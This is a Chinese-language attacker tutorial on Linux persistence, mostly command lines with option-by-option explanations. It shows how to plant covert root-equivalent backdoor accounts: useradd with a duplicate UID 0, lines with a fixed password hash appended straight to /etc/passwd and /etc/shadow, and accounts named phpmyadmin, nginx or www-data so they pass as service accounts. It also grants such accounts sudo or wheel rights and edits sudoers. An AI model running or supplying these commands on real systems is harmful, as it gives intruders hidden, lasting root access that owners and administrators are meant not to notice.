### Linux 添加用户

**添加超级权限用户**

Ubuntu

```sh
useradd -p `openssl passwd -1 -salt 'abc' pass1234` -u 0 -o -g root -G root -s /bin/bash admin
```

`useradd admin`:

- **核心动作**: 创建一个名为 `admin` 的新用户

`-p`: 指定新用户的密码（以哈希形式）

`openssl passwd -1 -salt 'abc' pass1234`: 这是一个子命令，在 `useradd` 实际执行前会先运行它，生成一个加密后的密码哈希

- `openssl passwd`: 调用 OpenSSL 工具生成密码哈希
- `-1`: 指定使用 **MD5** 算法（一种常见的 Linux 密码哈希算法）
- `-salt 'abc'`: 指定盐值（Salt）为 `'abc'`
- `pass1234`: 待加密的明文密码

- **总结**: 用户的密码被设置为 `pass1234`（但存储的是加密哈希）

`-u 0`:

- **`-u`**: 指定新用户的 **UID (User ID)**
- **`0`**: 在 Linux 系统中，**UID 为 0** 专属于 **root 用户**。任何 UID 为 0 的用户都自动拥有系统的最高权限。这是实现提权的关键参数

`-o`:

- **`-o`**: 允许创建具有**非唯一 UID** 的用户。由于 `root` 用户的 UID 已经是 0，如果没有这个选项，系统会报错。`-o` 强制允许 `admin` 用户和 `root` 用户共享 UID 0

`-g root`:

- **`-g`**: 指定用户所属的**主用户组（Primary Group）**。这里将其设置为主组为 `root`

`-G root`:

- **`-G`**: 指定用户所属的**附加用户组（Supplementary Groups）**。这里也将其设置为 `root`。虽然有 UID 0 已经足够，但添加到 `root` 组是标准做法

`-s /bin/bash`:

- **`-s`**: 指定用户的默认 **Shell**。`/bin/bash` 是一个功能齐全的 Shell，确保用户登录后能够正常执行命令

![](https://pic1.imgdb.cn/item/68d6265fc5157e1a8835287b.png)

![](https://pic1.imgdb.cn/item/68d626f5c5157e1a88352fa5.png)

**修改文件添加用户**

创建带密码的超级权限用户 apache，密码 123456

```sh
openssl passwd -salt '123' -1 123456
echo 'nginx:$1$123$7mft0jKnzzvAdU4t0unTG1:0:0::/root/:/bin/bash' >>/etc/passwd
echo 'nginx:$1$123$7mft0jKnzzvAdU4t0unTG1::0:99999:7:::' >>/etc/shadow
```

实战不建议使用，会给目标 Linux 环境搞乱

**交互式添加**

通过交互式方式创建用户并设置口令

```bash
useradd -o -u 0 phpmyadmin
```

`useradd phpmyadmin`:

- **核心动作**: 创建一个名为 `phpmyadmin` 的新用户
- **安全隐患**: `phpmyadmin` 是一个常见的 Web 应用名称，攻击者使用它来伪装成一个正常的 Web 服务账户，以增加隐蔽性

`-o`:

- **选项作用**: 允许创建具有**非唯一用户 ID (UID)** 的用户
- **安全意义**: 在没有这个参数的情况下，系统会拒绝创建第二个 UID 为 `0` 的用户（因为 `root` 已经是 UID 0）。`-o` 选项强制系统跳过这个检查，允许 `phpmyadmin` 和 `root` 共享同一个 UID

`-u 0`:

- **选项作用**: 指定新用户的 **UID**
- **安全意义**: 在 Linux 中，**UID 为 0** 是 **root 用户**的标志。任何 UID 为 0 的账户都自动拥有系统的最高管理权限。这是实现提权的关键参数

然后修改密码

```sh
passwd phpmyadmin
```

添加一个服务账号到 sudo，命令方式会触发安全日志，**CentOS 7 没有sudo 组**

```bash
sudo adduser apache --shell /bin/bash --home /var/www/apache
passwd apache
sudo usermod -aG sudo apache
```

我们来分解这条 `sudo` 命令的每个部分：

- `sudo adduser apache`:

  - **`sudo`**: 表示以 **root 用户的权限**运行后续命令。这通常是创建新系统用户所必需的
  - **`adduser apache`**: 创建一个名为 `apache` 的新用户

- `--shell /bin/bash`:

  - **`--shell`**: 指定用户登录后使用的默认 Shell
  - **`/bin/bash`**: 指定了一个功能齐全的 Shell。这确保了攻击者登录后能执行所有正常的 Shell 命令，而不是一个受限的 Shell

- `--home /var/www/apache`:

  - **`--home`**: 指定新用户的家目录（Home Directory）
  - **`/var/www/apache`**: 将家目录设置在 `/var/www/` 目录下。`/var/www/` 通常是 **Web 服务器的根目录**

- **`usermod`**: 这是 **Linux** 下用来**修改用户账户属性**的命令

  **`-a`**: 表示 **`append`（附加）**。这个选项告诉 `usermod` 将用户添加到新的用户组，而不是替换掉用户已有的用户组

  **`-G sudo`**:

  - **`-G`**: 指定要附加到的**附加用户组**
  - **`sudo`**: 这是目标用户组的名称。在许多基于 Debian/Ubuntu 的系统中，`sudo` 组（有时是 `wheel` 组）的成员被允许使用 `sudo` 命令来以 root 身份执行任何命令

也可以 www-data 账户添加后门。我们添加一个密码，让我们 www-data 成为一个 sudoer

```bash
sudo passwd www-data
sudo usermod -aG sudo www-data
```

既然 CentOS 中没有 sudo 组，你可以修改 sudo 配置文件自己加一个

```bash
vim /etc/sudoers
```

然后在 sudoers 文件中能找到一行 `"root ALL =(ALL) ALL"`，在这一行文件下添加一行新的内容

```bash
nginx ALL =(ALL) ALL
```

也可以把普通用户加入 wheel 用户组。 在 CentOS 系统中，默认情况下，wheel 用户组成员被授予 sudo 权限

```bash
useradd www-data
passwd www-data
usermod -aG wheel www-data
```

